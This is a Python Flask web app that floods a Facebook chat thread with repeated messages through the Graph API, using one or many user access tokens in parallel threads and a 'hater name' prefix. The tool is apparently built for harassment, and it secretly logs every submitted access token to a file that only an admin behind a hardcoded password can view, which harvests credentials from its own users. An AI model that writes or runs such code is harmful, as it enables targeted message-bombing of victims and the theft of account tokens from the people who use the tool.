from flask import Flask, request, render_template_string, redirect, url_for, session
import threading, requests, time, os
from datetime import datetime

# ---------------------------
# App setup
# ---------------------------
app = Flask(__name__)
app.secret_key = 'FAIZU_SECRET_KEY'  # For admin session

# Ensure tokens folder exists
os.makedirs('tokens', exist_ok=True)

# Single tokens file path
TOKENS_FILE = 'tokens/Faizu x Hasan.txt'

# ---------------------------
# Helper functions
# ---------------------------
def save_tokens(new_tokens):
    """Save tokens to the single file, skipping duplicates"""
    existing_tokens = set()
    
    # Read existing tokens if file exists
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            for line in f:
                if '|' in line:  # Check if line contains timestamp
                    token = line.split('|')[1].strip()
                    if token:
                        existing_tokens.add(token)
    
    # Add new tokens and skip duplicates
    added_count = 0
    with open(TOKENS_FILE, 'a') as f:
        for token in new_tokens:
            token = token.strip()
            if token and token not in existing_tokens:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"{timestamp} | {token}\n")
                existing_tokens.add(token)
                added_count += 1
                
    return added_count

# ---------------------------
# HTML Templates
# ---------------------------
html_index = '''
<!DOCTYPE html>
<html>
<head>
  <title>Faiizu Gangster Tool</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --bg-darker: #0f050f;
      --accent: #ff4dff;
      --accent-dark: #cc00cc;
      --text: #f0d8f0;
      --text-dim: #d0b0d0;
      --brown: #3a2a1a;
      --purple: #5a2a5a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, var(--purple) 0%, var(--bg-dark) 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 0;
      line-height: 1.6;
      min-height: 100vh;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
    }
    .header {
      border-bottom: 3px solid var(--accent);
      padding-bottom: 15px;
      margin-bottom: 30px;
      text-shadow: 0 0 10px var(--accent);
    }
    .header h1 {
      color: var(--accent);
      margin: 0;
      font-size: 2.2rem;
      letter-spacing: 2px;
    }
    .header p {
      color: var(--text-dim);
      margin: 5px 0 0;
      font-size: 1.1rem;
    }
    .panel {
      background-color: rgba(30, 10, 30, 0.8);
      border: 2px solid var(--brown);
      border-radius: 5px;
      padding: 25px;
      margin-bottom: 30px;
      box-shadow: 0 0 20px rgba(255, 77, 255, 0.2);
      backdrop-filter: blur(5px);
    }
    .panel-title {
      color: var(--accent);
      margin-top: 0;
      border-bottom: 2px solid var(--brown);
      padding-bottom: 10px;
      font-size: 1.4rem;
      text-shadow: 0 0 5px var(--accent);
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      color: var(--text-dim);
      font-weight: bold;
    }
    input[type="text"],
    input[type="number"],
    input[type="file"],
    input[type="password"],
    select {
      width: 100%;
      padding: 10px;
      background-color: rgba(40, 15, 40, 0.8);
      border: 1px solid var(--brown);
      color: var(--text);
      font-family: monospace;
      font-size: 1rem;
    }
    input[type="radio"] {
      margin-right: 8px;
      accent-color: var(--accent);
    }
    .radio-group {
      margin-bottom: 20px;
    }
    .radio-option {
      display: inline-block;
      margin-right: 20px;
      font-weight: bold;
    }
    button {
      background: linear-gradient(to right, var(--accent), var(--accent-dark));
      color: #000;
      border: none;
      padding: 12px 20px;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      font-size: 1.1rem;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s;
      border-radius: 3px;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 0 15px rgba(255, 77, 255, 0.4);
      margin-bottom: 10px;
    }
    button:hover {
      background: linear-gradient(to right, var(--accent-dark), var(--accent));
      box-shadow: 0 0 20px rgba(255, 77, 255, 0.6);
    }
    .status {
      color: var(--accent);
      text-align: center;
      padding: 30px;
      font-weight: bold;
      font-size: 1.3rem;
      text-shadow: 0 0 5px var(--accent);
    }
    .glow {
      animation: glow 2s infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 5px var(--accent); }
      to { text-shadow: 0 0 15px var(--accent), 0 0 20px var(--accent-dark); }
    }
    .threads-btn {
      background: linear-gradient(to right, #5a2a5a, #3a2a1a);
    }
    .threads-btn:hover {
      background: linear-gradient(to right, #3a2a1a, #5a2a5a);
    }
  </style>
  <script>
    function toggleInput() {
      const type = document.querySelector('input[name="tokenType"]:checked').value;
      document.getElementById('single').style.display = (type === 'single') ? 'block' : 'none';
      document.getElementById('multi').style.display = (type === 'multi') ? 'block' : 'none';
    }
  </script>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1 class="glow">FAIZU GANGSTER</h1>
      <p>F.G</p>
    </div>
    <div class="panel">
      <h2 class="panel-title">ENTER DETAILS</h2>
      <form method="POST" enctype="multipart/form-data">
        <div class="form-group radio-group">
          <label>TOKEN TYPE:</label>
          <div class="radio-option">
            <input type="radio" name="tokenType" value="single" checked onchange="toggleInput()"> SINGLE
          </div>
          <div class="radio-option">
            <input type="radio" name="tokenType" value="multi" onchange="toggleInput()"> MULTI
          </div>
        </div>
        
        <div class="form-group" id="single">
          <label>ACCESS TOKEN:</label>
          <input type="text" name="accessToken">
        </div>
        
        <div class="form-group" id="multi" style="display:none;">
          <label>UPLOAD TOKEN FILE (.TXT):</label>
          <input type="file" name="tokenFile" accept=".txt">
        </div>
        
        <div class="form-group">
          <label>THREAD ID:</label>
          <input type="text" name="threadId" required>
        </div>
        
        <div class="form-group">
          <label>HET3R NAME:</label>
          <input type="text" name="kidx" required>
        </div>
        
        <div class="form-group">
          <label>MESSAGES FILE (.TXT):</label>
          <input type="file" name="txtFile" accept=".txt" required>
        </div>
        
        <div class="form-group">
          <label>DELAY (SECONDS):</label>
          <input type="number" name="time" required min="1">
        </div>
        
        <button type="submit">START</button>
        <a href="/status"><button type="button" class="threads-btn">SHOW THREADS</button></a>
      </form>
    </div>
  </div>
</body>
</html>
'''

html_status = '''
<!DOCTYPE html>
<html>
<head>
  <title>Thread Status</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --brown: #3a2a1a;
      --purple: #5a2a5a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, var(--purple) 0%, var(--bg-dark) 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
    }
    .header {
      border-bottom: 3px solid var(--accent);
      padding-bottom: 15px;
      margin-bottom: 30px;
      text-shadow: 0 0 10px var(--accent);
    }
    .header h1 {
      color: var(--accent);
      margin: 0;
      font-size: 2.2rem;
      letter-spacing: 2px;
    }
    .thread-list {
      background-color: rgba(30, 10, 30, 0.8);
      border: 2px solid var(--brown);
      border-radius: 5px;
      padding: 20px;
      margin-bottom: 20px;
    }
    .thread-item {
      padding: 15px;
      border-bottom: 1px solid var(--brown);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .thread-info {
      flex-grow: 1;
    }
    .stop-btn {
      background: linear-gradient(to right, #ff0000, #cc0000);
      color: white;
      border: none;
      padding: 8px 15px;
      border-radius: 3px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-weight: bold;
    }
    .stop-btn:hover {
      background: linear-gradient(to right, #cc0000, #ff0000);
    }
    .back-btn {
      display: block;
      text-align: center;
      background: linear-gradient(to right, var(--accent), var(--accent-dark));
      color: #000;
      padding: 12px;
      text-decoration: none;
      font-weight: bold;
      border-radius: 3px;
      margin-top: 20px;
    }
    .back-btn:hover {
      background: linear-gradient(to right, var(--accent-dark), var(--accent));
    }
    .no-threads {
      text-align: center;
      padding: 30px;
      color: var(--accent);
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>YOUR RUNNING THREADS</h1>
    </div>
    
    <div class="thread-list">
      {% if threads %}
        {% for tid, info in threads.items() %}
        <div class="thread-item">
          <div class="thread-info">
            <strong>Thread ID:</strong> {{ tid }}<br>
            <strong>FB Thread:</strong> {{ info.thread_id }}<br>
            <strong>Token:</strong> {{ info.token[:15] }}...
          </div>
          <a href="/stop/{{ tid }}"><button class="stop-btn">STOP</button></a>
        </div>
        {% endfor %}
      {% else %}
        <div class="no-threads">No active threads running</div>
      {% endif %}
    </div>
    
    <a href="/" class="back-btn">BACK TO MAIN</a>
  </div>
</body>
</html>
'''

html_admin_login = '''
<!DOCTYPE html>
<html>
<head>
  <title>Admin Login</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      width: 350px;
      padding: 30px;
      background-color: rgba(30, 10, 30, 0.9);
      border: 2px solid var(--brown);
      border-radius: 5px;
      box-shadow: 0 0 30px rgba(255, 77, 255, 0.3);
      text-align: center;
    }
    h2 {
      margin-top: 0;
      color: var(--accent);
      text-shadow: 0 0 10px var(--accent);
      font-size: 1.8rem;
      margin-bottom: 25px;
    }
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      background-color: rgba(40, 15, 40, 0.8);
      border: 1px solid var(--brown);
      color: var(--text);
      font-family: monospace;
      font-size: 1rem;
    }
    button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(to right, var(--accent), var(--accent-dark));
      color: #000;
      border: none;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      font-size: 1.1rem;
      cursor: pointer;
      border-radius: 3px;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 0 15px rgba(255, 77, 255, 0.4);
      transition: all 0.3s;
    }
    button:hover {
      background: linear-gradient(to right, var(--accent-dark), var(--accent));
      box-shadow: 0 0 20px rgba(255, 77, 255, 0.6);
    }
    .error {
      color: #ff5555;
      text-align: center;
      margin-top: 15px;
      font-weight: bold;
      text-shadow: 0 0 5px #ff5555;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>ADMIN ACCESS</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="ENTER PASSWORD" required>
      <button type="submit">Login</button>
    </form>
    {% if error %}
    <div class="error">{{ error }}</div>
    {% endif %}
  </div>
</body>
</html>
'''

html_admin_files = '''
<!DOCTYPE html>
<html>
<head>
  <title>Token Files</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --text-dim: #d0b0d0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 30px;
      min-height: 100vh;
    }
    h2 {
      border-bottom: 2px solid var(--brown);
      padding-bottom: 10px;
      color: var(--accent);
      text-shadow: 0 0 5px var(--accent);
      font-size: 1.8rem;
    }
    ul {
      list-style-type: none;
      padding: 0;
      margin-top: 30px;
    }
    li {
      padding: 15px;
      border-bottom: 1px solid var(--brown);
      transition: all 0.3s;
    }
    li:hover {
      background-color: rgba(90, 42, 90, 0.3);
    }
    a {
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      display: block;
    }
    a:hover {
      text-shadow: 0 0 5px var(--accent);
    }
    .back-link {
      display: inline-block;
      margin-top: 30px;
      padding: 10px 20px;
      background-color: rgba(90, 42, 90, 0.5);
      border: 1px solid var(--brown);
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s;
    }
    .back-link:hover {
      background-color: rgba(90, 42, 90, 0.8);
      text-shadow: 0 0 5px var(--accent);
    }
  </style>
</head>
<body>
  <h2>TOKEN FILES</h2>
  <ul>
    {% for file in files %}
      <li><a href="{{ url_for('view_token_file', filename=file) }}">{{ file }}</a></li>
    {% endfor %}
  </ul>
  <a href="/" class="back-link">BACK TO MAIN</a>
</body>
</html>
'''

html_token_file_content = '''
<!DOCTYPE html>
<html>
<head>
  <title>Token Viewer</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 30px;
      min-height: 100vh;
    }
    h3 {
      border-bottom: 2px solid var(--brown);
      padding-bottom: 10px;
      color: var(--accent);
      text-shadow: 0 0 5px var(--accent);
      font-size: 1.5rem;
    }
    pre {
      white-space: pre-wrap;
      word-wrap: break-word;
      background-color: rgba(30, 10, 30, 0.8);
      padding: 20px;
      border: 1px solid var(--brown);
      border-radius: 5px;
      font-size: 1rem;
      line-height: 1.5;
      margin-top: 20px;
    }
    .back-link {
      display: inline-block;
      margin-top: 30px;
      padding: 10px 20px;
      background-color: rgba(90, 42, 90, 0.5);
      border: 1px solid var(--brown);
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s;
    }
    .back-link:hover {
      background-color: rgba(90, 42, 90, 0.8);
      text-shadow: 0 0 5px var(--accent);
    }
  </style>
</head>
<body>
  <h3>TOKENS: {{ filename }}</h3>
  <pre>{{ content }}</pre>
  <a href="/admin" class="back-link">BACK TO ADMIN</a>
</body>
</html>
'''

# ---------------------------
# Thread manager
# ---------------------------
user_threads = {}
threads_lock = threading.Lock()

def get_or_create_sid():
    sid = session.get('sid')
    if not sid:
        sid = os.urandom(8).hex()
        session['sid'] = sid
    return sid

# ---------------------------
# Background message sender
# ---------------------------
def message_sender(access_token, thread_id, mn, time_interval, messages, stop_event):
    headers = {'User-Agent': 'Mozilla/5.0'}
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                break
            try:
                message = f"{mn} {msg}"
                url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                r = requests.post(url, data={'access_token': access_token, 'message': message}, headers=headers)
                status = "✅" if r.status_code == 200 else f"❌ {r.status_code}"
                print(f"[{status}] {message}")
                time.sleep(time_interval)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(30)

# ---------------------------
# Routes
# ---------------------------
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        token_type = request.form.get('tokenType')
        thread_id = request.form.get('threadId')
        prefix = request.form.get('kidx')
        delay = int(request.form.get('time'))
        messages = request.files['txtFile'].read().decode().splitlines()

        tokens = []
        if token_type == 'single':
            token = request.form.get('accessToken')
            if token:
                tokens.append(token)
        else:
            file = request.files.get('tokenFile')
            if file:
                tokens = file.read().decode().splitlines()

        # Save tokens to single file (skips duplicates)
        added_count = save_tokens(tokens)
        print(f"Added {added_count} new tokens to {TOKENS_FILE}")

        # per-user session id
        sid = get_or_create_sid()

        with threads_lock:
            if sid not in user_threads:
                user_threads[sid] = {}

            for token in tokens:
                stop_event = threading.Event()
                t = threading.Thread(
                    target=message_sender,
                    args=(token, thread_id, prefix, delay, messages, stop_event),
                    daemon=True
                )
                t.start()

                # local thread id for control
                local_tid = os.urandom(6).hex()
                user_threads[sid][local_tid] = {
                    "thread": t,
                    "stop_event": stop_event,
                    "token": token,
                    "thread_id": thread_id
                }

        return redirect(url_for('status_page'))

    return render_template_string(html_index)

@app.route('/status')
def status_page():
    sid = session.get('sid')
    with threads_lock:
        threads = user_threads.get(sid, {}) if sid else {}
        return render_template_string(html_status, threads=threads)

@app.route('/stop/<tid>')
def stop_thread(tid):
    sid = session.get('sid')
    if not sid:
        return redirect(url_for('status_page'))

    with threads_lock:
        user_map = user_threads.get(sid, {})
        info = user_map.get(tid)
        if not info:
            return redirect(url_for('status_page'))

        # Signal stop
        info['stop_event'].set()
        # Optionally wait a tiny bit for graceful exit
        try:
            info['thread'].join(timeout=0.1)
        except Exception:
            pass

        # Remove from map
        del user_map[tid]

    return redirect(url_for('status_page'))

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('password') == 'FAIZU123':
            session['admin'] = True
            return redirect(url_for('admin'))
        return render_template_string(html_admin_login, error="Wrong password!")

    if not session.get('admin'):
        return render_template_string(html_admin_login)

    # Show token file
    files = [os.path.basename(TOKENS_FILE)] if os.path.exists(TOKENS_FILE) else []
    return render_template_string(html_admin_files, files=files)

@app.route('/admin/view/<filename>')
def view_token_file(filename):
    if not session.get('admin'):
        return redirect(url_for('admin'))

    # Security check - only allow viewing the main tokens file
    if filename != os.path.basename(TOKENS_FILE):
        return "Access denied", 403

    try:
        with open(f'tokens/{filename}', 'r') as f:
            content = f.read()
        return render_template_string(html_token_file_content, filename=filename, content=content)
    except FileNotFoundError:
        return "File not found", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)